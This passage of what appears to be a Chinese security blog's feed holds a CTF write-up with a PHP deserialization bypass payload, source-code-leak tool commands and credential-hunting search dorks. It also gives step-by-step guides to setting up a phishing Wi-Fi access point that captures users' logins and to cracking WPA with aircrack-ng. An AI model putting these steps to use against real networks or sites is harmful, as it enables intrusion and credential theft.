requests&#39;);}?code=</code></pre><p>构造payload：</p><pre><code>&lt;?phpclass xctf{public $flag = &#39;111&#39;;}$Lmg = new xctf();echo serialize($Lmg);?&gt;</code></pre><p>生成的字符串：<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br>成功获得flag</p><p><img src="/images/pasted-81.png" alt="upload successful"></p><h3 id="bypass反序列化正则"><a href="#bypass反序列化正则" class="headerlink" title="bypass反序列化正则"></a>bypass反序列化正则</h3><p>当执行反序列化时，使用正则<code>&#39;/[oc]:\d+:/i&#39;</code><br>进行拦截时，主要拦截O:数字:的反序列化字符串，那要怎么绕过呢？？？<br>php反序列化时O:+4:和O:4:的解析是一样的,具体是php的内核是这么写的<br>所以可以通过加+来进行绕过</p><h4 id="一个ctf例题-Web-php-unserialize"><a href="#一个ctf例题-Web-php-unserialize" class="headerlink" title="一个ctf例题(Web_php_unserialize)"></a>一个ctf例题(Web_php_unserialize)</h4><p>题目地址：<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1</a><br>打开题目是源代码：</p><pre><code>&lt;?php class Demo {     private $file = &#39;index.php&#39;;    public function __construct($file) {         $this-&gt;file = $file;     }    function __destruct() {         echo @highlight_file($this-&gt;file, true);     }    function __wakeup() {         if ($this-&gt;file != &#39;index.php&#39;) {             //the secret is in the fl4g.php            $this-&gt;file = &#39;index.php&#39;;         }     } }if (isset($_GET[&#39;var&#39;])) {     $var = base64_decode($_GET[&#39;var&#39;]);     if (preg_match(&#39;/[oc]:\d+:/i&#39;, $var)) {         die(&#39;stop hacking!&#39;);     } else {        @unserialize($var);     } } else {     highlight_file(&quot;index.php&quot;); } ?&gt;</code></pre><p><img src="/images/pasted-82.png" alt="upload successful"><br>所以构造payload来进行绕过：</p><pre><code>&lt;?php class Demo {     private $file = &#39;fl4g.php&#39;;}$x= serialize(new Demo);$x=str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$x);//绕过preg_match()$x=str_replace(&#39;:1:&#39;, &#39;:3:&#39;,$x);//绕过__wakeup()echo base64_encode($x);?&gt;</code></pre><p><code>TzorNDoiRGVtbyI6Mzp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code><br>var传入即可获得flag<br>如果这里没有base64加密，我么也需要进行url编码，因为demo中private为私有属性，反序列化会出现不可见字符，所以要进行url编码</p><p><img src="/images/pasted-83.png" alt="upload successful"></p><h2 id="如何防止php反序列化"><a href="#如何防止php反序列化" class="headerlink" title="如何防止php反序列化"></a>如何防止php反序列化</h2><ol><li>尽量不要用序列化来传输数据</li><li>不要相信用户传入数据，或者不让用户传入完整的序列化类型，进行过滤</li><li>隔离运行在低权限环境中的反序列化，记录反序列化异常和失败，例如传入类型不是预期类型，或者反序列化引发异常，限制或监视来自反序列化的容器或服务器的传入和传出网络连接，限制或监视来自反序列化的容器或服务器的传入和传出网络连接。监视反序列化，如果用户不断地反序列化，则发出警报。<h2 id="参考文章及说明"><a href="#参考文章及说明" class="headerlink" title="参考文章及说明"></a>参考文章及说明</h2>参考文章:<br><a href="https://blog.csdn.net/qq_45521281/article/details/107135706" target="_blank" rel="noopener">https://blog.csdn.net/qq_45521281/article/details/107135706</a><br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a><br><a href="https://xz.aliyun.com/t/7366#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/7366#toc-6</a><br>《从从0到1 ctfer的成长之路》<br>说明：本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文总结php的反序列化，有php反序列字符串逃逸，php反序列化pop链构造，php反序列化原生类的利用，phar反序列化，session
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/CTF/"/>
    
    
      <category term="php反序列化" scheme="https://lnng.top/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CTF常见源码泄露</title>
    <link href="https://lnng.top/posts/d545.html"/>
    <id>https://lnng.top/posts/d545.html</id>
    <published>2020-09-05T09:37:00.000Z</published>
    <updated>2020-09-12T15:32:48.511Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在ctf中发现很多源码泄露的题，总结一下，对于网站的搭建要注意删除备份文件，和一些工具的使用如git，svn等等的规范使用，避免备份文件出现在公网</p><h2 id="SVN源码泄露"><a href="#SVN源码泄露" class="headerlink" title="SVN源码泄露"></a>SVN源码泄露</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SVN（subversion）是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范。“在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息）</p><p>   更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。</p><h3 id="利用工具SvnHack"><a href="#利用工具SvnHack" class="headerlink" title="利用工具SvnHack"></a>利用工具SvnHack</h3><p>github项目地址:<a href="https://github.com/callmefeifei/SvnHack" target="_blank" rel="noopener">https://github.com/callmefeifei/SvnHack</a><br><strong>使用需要python2的环境</strong><br>列取目录:</p><pre><code>python SvnHack.py -u http://trafficbonus.com/.svn/entries</code></pre><p><img src="/images/pasted-3.png" alt="upload successful"><br>列取指定目录</p><pre><code>python SvnHack.py -u http://trafficbonus.com/.svn/entries -d sql</code></pre><p>读取指定代码</p><pre><code>python SvnHack.py -u http://trafficbonus.com/.svn/entries -r index.php</code></pre><p><img src="/images/pasted-4.png" alt="upload successful"><br>下载整站</p><pre><code>python SvnHack.py -u http://trafficbonus.com/.svn/entries --download</code></pre><p><img src="/images/pasted-5.png" alt="upload successful"></p><h2 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p><h3 id="利用githack-需要python2环境"><a href="#利用githack-需要python2环境" class="headerlink" title="利用githack(需要python2环境)"></a>利用githack(需要python2环境)</h3><p>github项目地址：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><pre><code>python GitHack.py http://www.openssl.org/.git/</code></pre><h2 id="hg源码泄露"><a href="#hg源码泄露" class="headerlink" title="hg源码泄露"></a>hg源码泄露</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>Mercurial 是一种轻量级分布式版本控制系统，使用 hg init的时候会生成.hg文件</p><h3 id="利用需要perl"><a href="#利用需要perl" class="headerlink" title="利用需要perl"></a>利用需要perl</h3><p>github项目地址：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">https://github.com/kost/dvcs-ripper</a><br>使用</p><pre><code>perl rip-hg.pl -v -u http://www.example.com/.hg/</code></pre><p><img src="/images/pasted-6.png" alt="upload successful"></p><h2 id="cvs漏洞泄露"><a href="#cvs漏洞泄露" class="headerlink" title="cvs漏洞泄露"></a>cvs漏洞泄露</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>CVS是一个C/S系统，是一个常用的代码版本控制软件。主要在开源软件管理中使用。与它相类似的代码版本控制软件有subversion。多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。CVS版本控制系统是一种GNU软件包，主要用于在多人开发环境下的源码的维护。但是由于之前CVS编码的问题，大多数软件开发公司都使用SVN替代了CVS。主要是针对 CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。<br><a href="http://url/CVS/Root" target="_blank" rel="noopener">http://url/CVS/Root</a> 返回根信息<br><a href="http://url/CVS/Entries" target="_blank" rel="noopener">http://url/CVS/Entries</a> 返回所有文件的结构</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>github项目地址：<a href="https://github.com/kost/dvcs-ripper.git" target="_blank" rel="noopener">https://github.com/kost/dvcs-ripper.git</a></p><p>运行示例:</p><pre><code>perl rip-cvs.pl -v -u http://www.example.com/CVS/</code></pre><h2 id="Bazaar-bzr泄露"><a href="#Bazaar-bzr泄露" class="headerlink" title="Bazaar/bzr泄露"></a>Bazaar/bzr泄露</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>Bazaar（bzr）是另一个开源的 DVCS（Distributed Version Control System，即分布式版本控制系统），它试图给 SCM（Source Code Management，即源码管理） 的世界里带来一些新的东西。<br>　　bzr 是 Canonical 公司支持的一个项目，也就是 Ubuntu Linux 的发行公司。简单来说，bzr 是用 python 编写的，用于版本控制。</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><pre><code>perl rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre><p><img src="/images/pasted-7.png" alt="upload successful"></p><h2 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h2><p>管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。</p><h3 id="常见备份文件后缀"><a href="#常见备份文件后缀" class="headerlink" title="常见备份文件后缀"></a>常见备份文件后缀</h3><pre><code>.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar</code></pre><h2 id="WEB-INF-web-xml-泄露"><a href="#WEB-INF-web-xml-泄露" class="headerlink" title="WEB-INF/web.xml 泄露"></a>WEB-INF/web.xml 泄露</h2><p>WEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF 主要包含一下文件或目录：</p><pre><code>WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)</code></pre><p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。</p><h3 id="CTF中WEB-INF-web-xml泄露"><a href="#CTF中WEB-INF-web-xml泄露" class="headerlink" title="CTF中WEB-INF/web.xml泄露"></a>CTF中WEB-INF/web.xml泄露</h3><p>平台：<a href="https://buuoj.cn" target="_blank" rel="noopener">https://buuoj.cn</a></p><p><img src="/images/pasted-12.png" alt="upload successful"><br>打开题目是一个登录框</p><p><img src="/images/pasted-13.png" alt="upload successful"><br>提示是java，登录框试试没发现什么，点击help发现</p><p><img src="/images/pasted-14.png" alt="upload successful"><br>有个download，改为post传输尝试任意文件下载<br>先传入WEB-INF/web.xml看看配置，上面说过了</p><p><img src="/images/pasted-15.png" alt="upload successful"><br>发现疑似一个类似flag的类文件，尝试下载<br>payload：</p><pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p><img src="/images/pasted-16.png" alt="upload successful"></p><p><img src="/images/pasted-17.png" alt="upload successful"><br>下载下来发现一个类似的base64加密的东西解密看看，成功获得flag</p><p><img src="/images/pasted-18.png" alt="upload successful"></p><h2 id="SWP-文件泄露"><a href="#SWP-文件泄露" class="headerlink" title="SWP 文件泄露"></a>SWP 文件泄露</h2><p>swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。</p><p>漏洞利用：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件。</p><h2 id="github源码泄露"><a href="#github源码泄露" class="headerlink" title="github源码泄露"></a>github源码泄露</h2><p>GitHub是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。</p><h3 id="github常见搜索语法"><a href="#github常见搜索语法" class="headerlink" title="github常见搜索语法"></a>github常见搜索语法</h3><pre><code>in:name test               #仓库标题搜索含有关键字 SpringCloudin:descripton test         #仓库描述搜索含有关键字in:readme test             #Readme文件搜素含有关键字stars:&gt;3000 test           #stars数量大于3000的搜索关键字stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字forks:&gt;1000 test           #forks数量大于1000的搜索关键字forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字user:test                  #用户名搜素license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字language:java test         #在java语言的代码中搜索关键字user:test in:name test     #组合搜索,用户名test的标题含有test的</code></pre><h3 id="Google邮箱搜索"><a href="#Google邮箱搜索" class="headerlink" title="Google邮箱搜索"></a>Google邮箱搜索</h3><p>使用 Github 进行邮件配置信息收集</p><p>很多网站及系统都会使用 pop3 和 smtp 发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如</p><p>果这时候我们动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了。</p><pre><code>site:Github.com smtpsite:Github.com smtp @qq.comsite:Github.com smtp @126.comsite:Github.com smtp @163.comsite:Github.com smtp @sina.com.cnsite:Github.com smtp passwordsite:Github.com String password smtp</code></pre><h3 id="数据库信息搜集"><a href="#数据库信息搜集" class="headerlink" title="数据库信息搜集"></a>数据库信息搜集</h3><pre><code>site:Github.com sa passwordsite:Github.com root passwordsite:Github.com User ID=’sa’;Passwordsite:Github.com inurl:sql</code></pre><h2 id="DS-Store泄露"><a href="#DS-Store泄露" class="headerlink" title=".DS_Store泄露"></a>.DS_Store泄露</h2><p>.DS_Store 文件利用 .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。###</p><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>github项目地址:<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a><br>使用下载后，进入目录更新python2库</p><pre><code>pip install -r requirements.txt</code></pre><pre><code>python ds_store_exp.py http://6974-59fce729-40f6-4124-a2c9-a5a66673dc66node3.buuoj.cn:28261/.DS_Store</code></pre><p>buuctf中的一道题演示，成功拉取了目录</p><p><img src="/images/pasted-8.png" alt="upload successful"></p><p><img src="/images/pasted-9.png" alt="upload successful"></p><h2 id="一个ctf目录扫描小工具"><a href="#一个ctf目录扫描小工具" class="headerlink" title="一个ctf目录扫描小工具"></a>一个ctf目录扫描小工具</h2><p>当然也可以自己编写字典，编写脚本，或用dirsearch，御剑等工具扫描，下面介绍一个自己用的ctf目录扫描<br>项目地址:<a href="https://github.com/kingkaki/ctf-wscan" target="_blank" rel="noopener">https://github.com/kingkaki/ctf-wscan</a></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>python3 ctf-wscan.py <a href="http://beed29ec-8f77-4e15-a1d6-c327148dab8e.node3.buuoj.cn/" target="_blank" rel="noopener">http://beed29ec-8f77-4e15-a1d6-c327148dab8e.node3.buuoj.cn/</a></p><p><img src="/images/pasted-10.png" alt="upload successful"><br>参数k可以设置关键词<br>config.py还可以设置关键词，线程，请求方式，是否记录等等，如果你懒得写脚本可以使用，好吧我是懒狗</p><p><img src="/images/pasted-11.png" alt="upload successful"></p><h2 id="参考文章及说明"><a href="#参考文章及说明" class="headerlink" title="参考文章及说明"></a>参考文章及说明</h2><p>文件的泄露基本都是人为的不正常操作导致的，如直接复制网站发布，github同步，git的.git未删除，注意使用规范，查看自己网站的目录的文件特别是隐藏文件就能很容易的发现文件的泄露。<br>参考文章:<a href="https://www.cnblogs.com/yesec/p/12232045.html" target="_blank" rel="noopener">https://www.cnblogs.com/yesec/p/12232045.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在ctf中发现很多源码泄露的题，总结一下，对于网站的搭建要注意删除备份文件，和一些工具的使用如git，svn等等的规范使用，避免备份文件出现
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://lnng.top/categories/CTF/"/>
    
    
      <category term="信息泄露" scheme="https://lnng.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>简单快速搭建钓鱼wifi</title>
    <link href="https://lnng.top/posts/8b06.html"/>
    <id>https://lnng.top/posts/8b06.html</id>
    <published>2020-08-14T05:37:00.000Z</published>
    <updated>2020-08-21T10:59:50.177Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>钓鱼wifi是很久的话题了，但是传统的方法可能比较麻烦需要手动配置dhcp，dns，网卡，流量转发，比较麻烦，而且还有根据每次的网络环境需要重新的配置，这里介绍用WIFIpumpkin3工具简单快速的搭建钓鱼wifi</p><h2 id="WIFIpumpkin3的安装"><a href="#WIFIpumpkin3的安装" class="headerlink" title="WIFIpumpkin3的安装"></a>WIFIpumpkin3的安装</h2><p>WIFIpumpkin3依托的是python来构建dns，dhcp所以需要python环境且python环境要大于3.7，目前似乎不支持windows和mac，我用的kali上面已经集成了python3.8的环境，所以就不介绍python&gt;=3.7的安装了，需要的自行百度，下面的操作都是在kali2020.2上其他环境的安装参考官方文档<a href="https://wifipumpkin3.github.io/docs/getting-started" target="_blank" rel="noopener">WIFIpumpkin3</a></p><h3 id="python安装依赖"><a href="#python安装依赖" class="headerlink" title="python安装依赖"></a>python安装依赖</h3><pre><code>sudo apt install libssl-dev libffi-dev build-essential</code></pre><h3 id="安装git，kali中似乎已经集成"><a href="#安装git，kali中似乎已经集成" class="headerlink" title="安装git，kali中似乎已经集成"></a>安装git，kali中似乎已经集成</h3><pre><code>apt-get install git</code></pre><h3 id="下载WIFIpumpkin3"><a href="#下载WIFIpumpkin3" class="headerlink" title="下载WIFIpumpkin3"></a>下载WIFIpumpkin3</h3><p>选择合适的目录</p><pre><code>git clone https://github.com/P0cL4bs/wifipumpkin3.git</code></pre><p>下载完毕进入目录</p><pre><code>cd wifipumpkin3</code></pre><h3 id="安装PyQt5"><a href="#安装PyQt5" class="headerlink" title="安装PyQt5"></a>安装PyQt5</h3><pre><code>sudo apt install python3-pyqt5</code></pre><p>验证是否安装成功，如果打印了done则表示安装成功</p><pre><code>python3 -c &quot;from PyQt5.QtCore import QSettings; print(&#39;done&#39;)&quot;</code></pre><h3 id="编译安装WIFIpumpkin3"><a href="#编译安装WIFIpumpkin3" class="headerlink" title="编译安装WIFIpumpkin3"></a>编译安装WIFIpumpkin3</h3><pre><code>sudo python3 setup.py install</code></pre><p>如果显示下图这样就代表安装成功了<br><img src="https://Lmg66.github.io/img/175.png" alt="图片"></p><h2 id="WIFIpumpkin3创建钓鱼wifi"><a href="#WIFIpumpkin3创建钓鱼wifi" class="headerlink" title="WIFIpumpkin3创建钓鱼wifi"></a>WIFIpumpkin3创建钓鱼wifi</h2><p>启动wifipumpkin3</p><pre><code>wifipumpkin3</code></pre><p><img src="https://Lmg66.github.io/img/176.png" alt="图片"></p><p>设置网卡这里的网卡同样要具备ap模拟的网卡，wlan0为你的网卡</p><pre><code>set interface wlan0 </code></pre><p>设置wifi名称也就是ssid，demo修改为你要创建的wifi</p><pre><code>set ssid demo</code></pre><p>设置代理插件</p><pre><code>set proxy noproxy</code></pre><p>设置dns</p><pre><code>ignore pydns_server</code></pre><p>开启钓鱼wifi</p><pre><code>start</code></pre><p><img src="https://Lmg66.github.io/img/177.png" alt="图片"></p><h2 id="查看利用"><a href="#查看利用" class="headerlink" title="查看利用"></a>查看利用</h2><p>这里我们用手机连接一下，发现成功分配ip且有网络<br><img src="https://Lmg66.github.io/img/178.png" alt="图片"></p><p>看一下kali，这里显示了连接而且显示了连接的手机的型号<br><img src="https://Lmg66.github.io/img/179.png" alt="图片"></p><p>继续，我们用手机登录一个网站<br><img src="https://Lmg66.github.io/img/180.png" alt="图片"><br>看一下kali，发现抓取到了账号密码，而且还有流量记录的信息图片等等，okwifi钓鱼完成<br><img src="https://Lmg66.github.io/img/181.png" alt="图片"></p><h2 id="参考文章及说明"><a href="#参考文章及说明" class="headerlink" title="参考文章及说明"></a>参考文章及说明</h2><p>上文从渗透的角度说明陌生ifi，攻击者可以利用树莓派等小型设备放入大型的公共场所设置免费公共wifi是非常可怕的，所以提醒最好最好最好(重要的事情说三遍)不要连接陌生的wifi很容易盗取你的信息<br>WIFIpumpkin3还有很多用途可以自行探索，本文参考地址:<a href="https://wifipumpkin3.github.io/docs/getting-started" target="_blank" rel="noopener">https://wifipumpkin3.github.io/docs/getting-started</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;钓鱼wifi是很久的话题了，但是传统的方法可能比较麻烦需要手动配置dhcp，dns，网卡，流量转发，比较麻烦，而且还有根据每次的网络环境需要
      
    
    </summary>
    
    
      <category term="无线安全" scheme="https://lnng.top/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="搭建钓鱼wifi" scheme="https://lnng.top/tags/%E6%90%AD%E5%BB%BA%E9%92%93%E9%B1%BCwifi/"/>
    
  </entry>
  
  <entry>
    <title>wifi渗透</title>
    <link href="https://lnng.top/posts/5e65.html"/>
    <id>https://lnng.top/posts/5e65.html</id>
    <published>2020-08-10T12:31:04.000Z</published>
    <updated>2020-08-14T05:37:48.259Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要讲述 <strong>家庭家庭家庭中</strong>（重要的事情说三遍，企业认证服务器的wifi一般非常非常的安全破解不来）如何破解wifi密码，破解wifi密码后的内网渗透利用(简单说明)，如何设置wifi路由器更安全，从渗透的方面看wifi安全，根据需求选择观看</p><h2 id="wifi渗透环境的打造"><a href="#wifi渗透环境的打造" class="headerlink" title="wifi渗透环境的打造"></a>wifi渗透环境的打造</h2><h3 id="硬件方面"><a href="#硬件方面" class="headerlink" title="硬件方面"></a>硬件方面</h3><p>需要支持监听模式的无线网卡，一般电脑自带的无线网卡是不支持监听模式的，需要购买<br>内置kail驱动 RT3070 RTL8187(推荐使用)<br>我购买的链接如下，用着还行，监听信号比手机强那么一点点<br><a href="https://m.tb.cn/h.VGGIItU?sm=0b7bf6" target="_blank" rel="noopener">https://m.tb.cn/h.VGGIItU?sm=0b7bf6</a></p><h3 id="软件方面"><a href="#软件方面" class="headerlink" title="软件方面"></a>软件方面</h3><p>因为wifi破解需要软件支持，Windows下载麻烦，推荐kali(因为kali自带很多工具)<br>因为用到kali，建议使用vmware虚拟机，不建议小白双系统kali或者Microsoft Store中的kali<br>vmware下载查看：<a href="https://www.52pojie.cn/thread-1026907-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1026907-1-1.html</a><br><strong>注意</strong>：无线网卡监听模式时如果出现vmware卡代码，监听时间长就停止的情况建议更换上面这个文章的vmware版本<br>kali的vm镜像下载，下载解压，vmware打开即可使用，下载地址: <a href="https://images.offensive-security.com/virtual-images/kali-linux-2020.2a-vmware-amd64.7z?_ga=2.152625529.1921388440.1596879427-46569499.1595490768" target="_blank" rel="noopener">https://images.offensive-security.com/virtual-images/kali-linux-2020.2a-vmware-amd64.7z?_ga=2.152625529.1921388440.1596879427-46569499.1595490768</a></p><h3 id="vmware和kali和无线网卡基础知识-选看"><a href="#vmware和kali和无线网卡基础知识-选看" class="headerlink" title="vmware和kali和无线网卡基础知识(选看)"></a>vmware和kali和无线网卡基础知识(选看)</h3><h4 id="USB无线网卡在kali-Linux的使用"><a href="#USB无线网卡在kali-Linux的使用" class="headerlink" title="USB无线网卡在kali Linux的使用"></a>USB无线网卡在kali Linux的使用</h4><ol><li>先不要开机 先打开服务<br><img src="https://Lmg66.github.io/img/148.png" alt="图片"></li><li>运行下图的<br><img src="https://Lmg66.github.io/img/149.png" alt="图片"></li><li>开机kali后 虚拟机选择网卡的连接<br><img src="https://Lmg66.github.io/img/150.png" alt="图片"></li><li>ifconfig 查看连接一般名字为wlan,但有肯能无线网卡处于down状态可用ifconfig -a查看,然后使ifconfig name up即可<h4 id="无线网卡一般有四种工作模式，即-Managed，Master，Ad-hoc，Monitor。"><a href="#无线网卡一般有四种工作模式，即-Managed，Master，Ad-hoc，Monitor。" class="headerlink" title="无线网卡一般有四种工作模式，即 Managed，Master，Ad-hoc，Monitor。"></a>无线网卡一般有四种工作模式，即 Managed，Master，Ad-hoc，Monitor。</h4>Managed 模式：该模式用于你的无线客户端直接与无线接入点（Access Point，即AP）进行接入连接。在这个模式中，我们可以进行无线接入internet上网，无线网卡的驱动程序依赖无线AP管理整个通信过程。<br>Master 模式：一些无线网卡支持Master模式。这个模式允许无线网卡使用特制的驱动程序和软件工作，作为其他设备的无线AP。它主要使用于无线接入点AP提供无线接入服务以及路由功能。比如无线路由器就是工作在Master模式下了，对于普通的pc机来说，如果有合适的硬件它也可以变成一台无线AP。<br>Ad hoc模式：当你的网络由互相直连的设备组成时，就使用这个模式。在这个模式中，各设备之间采用对等网络的方式进行连接，无线通信双方共同承担无线AP的职责。<br>Monitor 模式：Monitor模式主要用于监控无线网络内部的流量，用于检查网络和排错。要使Wireshark捕获无线数据包，你的无线网卡和配套驱动程序必须支持监听模式（也叫RFMON模式）。<h4 id="kali桥接网卡上网"><a href="#kali桥接网卡上网" class="headerlink" title="kali桥接网卡上网"></a>kali桥接网卡上网</h4><img src="https://Lmg66.github.io/img/151.png" alt="图片"><br>参见:<a href="https://www.linuxidc.com/Linux/2016-09/135521p3.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2016-09/135521p3.htm</a><h2 id="wifi密码的破解"><a href="#wifi密码的破解" class="headerlink" title="wifi密码的破解"></a>wifi密码的破解</h2>因为wep加密已经没有使用的，非常不安全，就忽略了<h3 id="最简单最好用的wifi密码破解方法"><a href="#最简单最好用的wifi密码破解方法" class="headerlink" title="最简单最好用的wifi密码破解方法"></a>最简单最好用的wifi密码破解方法</h3>使用wifi万能钥匙，腾讯wifi管家等等，其原理就是wifi密码共享，使用过该软件会将你的连接过的wifi密码共享出去，其本身不是破解而是共享制，连接后我们就可以看见密码了，所以这种破解方法非常的好用，首先推荐<h3 id="基础说明airodump-ng"><a href="#基础说明airodump-ng" class="headerlink" title="基础说明airodump-ng"></a>基础说明airodump-ng</h3><pre><code>airmon-ng start wlan0     开启监听模式airodump-ng wlan0mon      开始扫描附近wifi</code></pre>airodump-ng wlan0mon参数：</li></ol><p>-w    输出文件<br>–ivs    只保存ivs，不再保存所有无线数据，只是保存可以用于破解的IVS数据报文<br>-c    指定信道<br>–bssid    指定路由的bssid也就是MAC地址<br>–essid    指定路由的essid，可以理解为wifi名称（不准确）<br>airodump-ng wlan0mon 扫描参数<br><img src="https://Lmg66.github.io/img/152.png" alt="图片"><br>    BSSID    AP的MAC地址<br>    PWR    信号强度接近0信号好<br>    Beacons    无线ap的发送通告，告诉我是谁 周期发送<br>    #Data    抓到的数据包<br>    CH    信道<br>    MB    最大传输速度<br>    ENC    加密方法<br>    CIPHER    加密算法<br>    AUTH    认证协议<br>    ESSID    通指wifi名字 无名表示未广播<br>    STATION    客户端<br>    RATE    传输速率<br>    Lost    最近10秒的丢包数<br>    Frames    来自客户端的数据<br>    Probes    主动弹出 如果客户端正试图连接一个AP但没有连上，会显示这里<br>Aircrack-ng工具包</p><ul><li>aircrack-ng 破解</li><li>airmon-ng 改变网卡工作模式</li><li>airodump-ng 捕获报文</li><li>aireplay-ng 提供各种攻击</li><li>airserv-ng 网卡连接到指定端口 用作无限跳板</li><li>airolib-ng 彩虹表破解创建数据库文件</li><li>airdecap-ng 解包<h3 id="WPA破解"><a href="#WPA破解" class="headerlink" title="WPA破解"></a>WPA破解</h3>指定监听的wifi<br>airodump-ng -w [文件] –bssid 